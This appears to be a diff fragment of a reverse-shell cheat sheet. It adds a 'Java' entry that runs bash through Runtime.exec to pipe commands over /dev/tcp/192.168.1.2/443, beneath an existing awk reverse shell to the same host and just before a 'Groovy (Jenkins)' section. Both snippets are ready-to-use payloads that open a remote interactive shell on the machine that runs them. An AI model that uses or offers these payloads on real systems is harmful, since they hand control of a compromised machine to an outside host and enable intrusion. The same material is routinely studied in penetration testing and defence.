@@ -129,6 +129,13 @@
   awk 'BEGIN {s = "/inet/tcp/0/192.168.1.2/443"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null
   ```
   
+  `Java`
+
+  ```cmd
+  r = Runtime.getRuntime()
+  p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/192.168.1.2/443;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
+  p.waitFor()
+  ```
   
 `Groovy (Jenkins)`
 
